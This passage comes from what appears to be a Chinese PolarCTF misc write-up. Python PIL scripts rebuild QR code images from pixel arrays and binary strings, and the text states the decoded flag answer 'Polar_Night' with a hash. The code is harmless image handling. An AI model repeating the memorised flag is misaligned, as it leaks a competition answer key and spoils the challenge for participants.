class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空白图像</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">33</span>, <span class="number">33</span>), color = <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充像素点颜色</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        img.putpixel((x, y), image_list[y][x])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示图像</span></span><br><span class="line">img.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存图像</span></span><br><span class="line">img.save(<span class="string">&#x27;restored_flag.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20231208092154595.png" alt="image-20231208092154595"></p><p>扫码得到Polar_Night,0f46d4b056acb49f06b1090bab56189d</p><h5 id="01"><a href="#01" class="headerlink" title="01"></a>01</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入01数据</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="string">&#x27;1111111011111001001111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001000000001101000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101000100010101011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101010011110001011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101001110010101011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001000111001001000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111010101010101111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000000000110001000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0010111011011101010001001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1110100111100111010101001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0110001100010000110111011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000100100001010111100010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0001001111110100110001001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0001000110000101110101010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001111000010111101011011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0101010001010010100000010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001001011100111111111001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000000011011100100010001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111001100010101011011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001011111001100011000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101011001010111111000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101000001110010111010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101011001000111110101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001001101001001110010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111000010001000011011&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空白图像</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="built_in">len</span>(data[<span class="number">0</span>]), <span class="built_in">len</span>(data)), color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充像素点颜色</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[<span class="number">0</span>])):</span><br><span class="line">        pixel = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">if</span> data[y][x] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">else</span> (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        img.putpixel((x, y), pixel)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示图像</span></span><br><span class="line">img.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存图像</span></span><br><span class="line">img.save(<span class="string">&#x27;restored_image.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20231208093657267.png" alt="image-20231208093657267"></p><p>解出来第一次见这种编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 